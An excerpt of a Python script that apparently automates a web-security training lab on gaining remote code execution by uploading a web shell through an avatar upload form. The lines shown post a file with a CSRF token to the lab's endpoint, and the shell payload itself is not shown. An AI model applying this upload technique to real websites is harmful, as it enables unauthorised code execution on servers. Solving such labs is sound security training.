...
parser = argparse.ArgumentParser(description='Solves the following Lab: Remote code execution via web shell upload')
...
requests.post("https://" + lab.id + ".web-security-academy.net/my-account/avatar", headers=headers, data={"csrf":csrf,"user":"wiener"}, files=files)
